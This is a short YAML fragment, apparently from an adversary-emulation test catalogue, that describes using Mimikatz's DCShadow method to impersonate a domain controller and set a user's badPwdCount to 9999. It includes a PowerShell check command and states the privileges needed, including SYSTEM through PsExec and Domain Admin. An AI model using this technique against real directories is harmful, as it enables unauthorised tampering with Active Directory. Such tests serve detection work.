- description: 'Use Mimikatz DCShadow method to simulate behavior of a Domain Controller
    and edit protected attribute.

    It will set the badPwdCount attribute of the target user (user/machine account)
    to 9999. You can check after with:

    Get-ADObject -LDAPFilter ''(samaccountname=<user>)'' -Properties badpwdcount |
    select-object -ExpandProperty badpwdcount


    Need SYSTEM privileges locally (automatically obtained via PsExec, so running
    as admin is sufficient), and Domain Admin remotely.

    The easiest is to run elevated and as a Domain Admin user.
